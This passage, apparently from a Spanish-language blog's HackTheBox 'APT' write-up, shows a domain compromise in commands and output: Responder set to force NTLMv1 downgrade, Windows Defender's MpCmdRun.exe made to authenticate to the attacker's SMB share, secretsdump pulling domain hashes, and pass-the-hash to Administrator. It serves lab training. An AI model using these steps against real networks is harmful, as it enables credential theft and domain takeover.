+  <li>
+    <p>Ahora usamos el <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> para que desde nuestro equipo se ejecute indicándole la ruta y lo estaríamos inyectando en memoria.</p>
+  </li>
+  <li>
+    <p>Una vez que termine nos reportara todo el <code class="language-plaintext highlighter-rouge">output</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Invoke-Binary /home/miguel/Hackthebox/APT/content/winPEASx64.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Lo mas interesante es esto vemos que soporta <code class="language-plaintext highlighter-rouge">NTLMv1</code> y es criptografía débil.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Enumerating NTLM Settings
+  LanmanCompatibilityLevel    : 2 <span class="o">(</span>Send NTLM response only<span class="o">)</span>
+
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : True
+      ServerNegotiateSigning  : True
+      LdapSigning             : Negotiate signing <span class="o">(</span>Negotiate signing<span class="o">)</span>
+
+  Session Security
+      NTLMMinClientSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>
+        <span class="o">[!]</span> NTLM clients support NTLMv1!
+      NTLMMinServerSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>
+
+        <span class="o">[!]</span> NTLM services on this machine support NTLMv1!
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     :  <span class="o">(</span>Not defined<span class="o">)</span>
+      OutboundRestrictions    :  <span class="o">(</span>Not defined<span class="o">)</span>
+      InboundAuditing         :  <span class="o">(</span>Not defined<span class="o">)</span>
+      OutboundExceptions      :
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Algo que podemos hacer es robar el hash <strong>NTLMv1</strong> con el <code class="language-plaintext highlighter-rouge">responder</code> <a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a>.</p>
+  </li>
+  <li>
+    <p>Primeramente necesitamos especificar el <strong>challenge</strong> en el archivo <code class="language-plaintext highlighter-rouge">/usr/share/responder/Responder.conf</code> .</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> Custom challenge.
+<span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
+<span class="c">#Challenge = Random</span>
+Challenge <span class="o">=</span> 1122334455667788
+<span class="p">;</span> SQLite Database file
+<span class="p">;</span> Delete this file to re-capture previously captured hashes
+Database <span class="o">=</span> Responder.db
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora desplegamos el <code class="language-plaintext highlighter-rouge">responder</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+  To <span class="nb">kill </span>this script hit CTRL-C
+
+
+<span class="o">[</span>+] Poisoners:
+    LLMNR                      <span class="o">[</span>ON]
+    NBT-NS                     <span class="o">[</span>ON]
+    MDNS                       <span class="o">[</span>ON]
+    DNS                        <span class="o">[</span>ON]
+    DHCP                       <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>OFF]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+    Kerberos server            <span class="o">[</span>ON]
+    SQL server                 <span class="o">[</span>ON]
+    FTP server                 <span class="o">[</span>ON]
+    IMAP server                <span class="o">[</span>ON]
+    POP3 server                <span class="o">[</span>ON]
+    SMTP server                <span class="o">[</span>ON]
+    DNS server                 <span class="o">[</span>ON]
+    LDAP server                <span class="o">[</span>ON]
+    MQTT server                <span class="o">[</span>ON]
+    RDP server                 <span class="o">[</span>ON]
+    DCE-RPC server             <span class="o">[</span>ON]
+    WinRM server               <span class="o">[</span>ON]
+    SNMP server                <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] HTTP Options:
+    Always serving EXE         <span class="o">[</span>OFF]
+    Serving EXE                <span class="o">[</span>OFF]
+    Serving HTML               <span class="o">[</span>OFF]
+    Upstream Proxy             <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Poisoning Options:
+    Analyze Mode               <span class="o">[</span>OFF]
+    Force WPAD auth            <span class="o">[</span>OFF]
+    Force Basic Auth           <span class="o">[</span>OFF]
+    Force LM downgrade         <span class="o">[</span>ON]
+    Force ESS downgrade        <span class="o">[</span>ON]
+
+<span class="o">[</span>+] Generic Options:
+    Responder NIC              <span class="o">[</span>tun0]
+    Responder IP               <span class="o">[</span>10.10.14.222]
+    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
+    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
+    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-X53SCZ99DLB]
+    Responder Domain Name      [GU17.LOCAL]
+    Responder DCE-RPC Port     [47394]
+
+[+] Listening for events...
+</span></code></pre></div></div>
+
+<ul>
+  <li>Algo que podemos hacer para hacer la autenticación como el <code class="language-plaintext highlighter-rouge">defender</code> esta habilitado podemos hacer que haga un escaneo de un recurso compartido a nivel de red atreves del <code class="language-plaintext highlighter-rouge">MpCmdRun.exe</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----       11/21/2016   1:53 AM                en-US
+d-----        9/24/2020   9:15 AM                platform
+<span class="nt">-a----</span>        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
+<span class="nt">-a----</span>         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
+<span class="nt">-a----</span>        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
+<span class="nt">-a----</span>         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
+<span class="nt">-a----</span>        3/28/2017   6:23 AM         224256 DataLayer.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM        1514688 DbgHelp.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM         724480 EppManifest.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM            361 FepUnregister.mof
+<span class="nt">-a----</span>         3/4/2021   5:03 AM          86528 MpAsDesc.dll
+<span class="nt">-a----</span>         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
+<span class="nt">-a----</span>         3/4/2021   4:55 AM         928768 MpClient.dll
+<span class="nt">-a----</span>         3/4/2021   5:42 AM         377648 MpCmdRun.exe
+<span class="nt">-a----</span>         3/4/2021   4:58 AM         335360 MpCommu.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM         113152 MpEvMsg.dll
+<span class="nt">-a----</span>         3/4/2021   5:01 AM         101888 MpOAV.dll
+<span class="nt">-a----</span>         1/7/2021  10:55 PM         178176 MpProvider.dll
+<span class="nt">-a----</span>         3/4/2021   4:57 AM         526336 MpRtp.dll
+<span class="nt">-a----</span>         3/4/2021   4:55 AM        2000384 MpSvc.dll
+<span class="nt">-a----</span>         3/4/2021   5:02 AM          76288 MsMpCom.dll
+<span class="nt">-a----</span>         3/4/2021   5:42 AM          97184 MsMpEng.exe
+<span class="nt">-a----</span>         3/4/2021   5:05 AM           4608 MsMpLics.dll
+<span class="nt">-a----</span>         3/4/2021   5:03 AM          53248 NisLog.dll
+<span class="nt">-a----</span>         3/4/2021   5:48 AM         339400 NisSrv.exe
+<span class="nt">-a----</span>         3/4/2021   5:03 AM          66048 NisWfp.dll
+<span class="nt">-a----</span>        4/28/2017  12:52 AM         551424 ProtectionManagement.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM          57424 ProtectionManagement.mof
+<span class="nt">-a----</span>        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof
+<span class="nt">-a----</span>        7/16/2016   2:12 PM         156864 SymSrv.dll
+<span class="nt">-a----</span>        7/16/2016   2:12 PM              1 SymSrv.yes
+<span class="nt">-a----</span>        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Con esto vamos a escanear un archivo de un recurso compartido a nivel de red de nosotros que no es obligatorio que exista solo es para hacer la autenticación y robar el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.222<span class="se">\y</span>o
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+  To <span class="nb">kill </span>this script hit CTRL-C
+
+
+<span class="o">[</span>+] Poisoners:
+    LLMNR                      <span class="o">[</span>ON]
+    NBT-NS                     <span class="o">[</span>ON]
+    MDNS                       <span class="o">[</span>ON]
+    DNS                        <span class="o">[</span>ON]
+    DHCP                       <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>OFF]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+    Kerberos server            <span class="o">[</span>ON]
+    SQL server                 <span class="o">[</span>ON]
+    FTP server                 <span class="o">[</span>ON]
+    IMAP server                <span class="o">[</span>ON]
+    POP3 server                <span class="o">[</span>ON]
+    SMTP server                <span class="o">[</span>ON]
+    DNS server                 <span class="o">[</span>ON]
+    LDAP server                <span class="o">[</span>ON]
+    MQTT server                <span class="o">[</span>ON]
+    RDP server                 <span class="o">[</span>ON]
+    DCE-RPC server             <span class="o">[</span>ON]
+    WinRM server               <span class="o">[</span>ON]
+    SNMP server                <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] HTTP Options:
+    Always serving EXE         <span class="o">[</span>OFF]
+    Serving EXE                <span class="o">[</span>OFF]
+    Serving HTML               <span class="o">[</span>OFF]
+    Upstream Proxy             <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Poisoning Options:
+    Analyze Mode               <span class="o">[</span>OFF]
+    Force WPAD auth            <span class="o">[</span>OFF]
+    Force Basic Auth           <span class="o">[</span>OFF]
+    Force LM downgrade         <span class="o">[</span>ON]
+    Force ESS downgrade        <span class="o">[</span>ON]
+
+<span class="o">[</span>+] Generic Options:
+    Responder NIC              <span class="o">[</span>tun0]
+    Responder IP               <span class="o">[</span>10.10.14.222]
+    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
+    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
+    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-X53SCZ99DLB]
+    Responder Domain Name      [GU17.LOCAL]
+    Responder DCE-RPC Port     [47394]
+
+[+] Listening for events...
+
+[SMB] NTLMv1 Client   : 10.129.96.60
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+[*] Skipping previously captured hash for HTB\APT$
+[*] Skipping previously captured hash for HTB\APT$
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Podríamos usar esta web para crackear el hash pero esta en mantenimiento <a href="https://crack.sh/get-cracking/">https://crack.sh/get-cracking/</a> y como no esta operativa no podemos crackear el hash así yo le pedí a mi compañero que en su momento hiso la maquina que me pasara el hash por que la pagina web estaba operativa cuando el la hiso.</p>
+  </li>
+  <li>
+    <p>Con el hash podemos <code class="language-plaintext highlighter-rouge">dumpear</code> todos los hashes de los usuarios.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'htb.local/APT$@apt'</span> <span class="nt">-hashes</span> :d167c3238864b12f5f82feae86a7f798
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+APT<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
+Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
+Administrator:des-cbc-md5:0816d9d052239b8a
+krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
+krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
+krbtgt:des-cbc-md5:f8c26238c2d976bf
+henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
+henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
+henry.vinson:des-cbc-md5:73b6f71cae264fad
+henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
+henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
+henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
+APT<span class="nv">$:</span>aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
+APT<span class="nv">$:</span>aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
+APT<span class="nv">$:</span>des-cbc-md5:76c45245f104a4bf
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+
+<ul>
+  <li>Ahora teniendo el hash del usuario administrador podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-wirnm</code> y obtener la ultima flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'c370bddf384a691d811ff3495e8a72e2'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>htb<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+c52c0f60732da145b5ca1d4da4a65287
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/insane/2024/04/14/apt.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
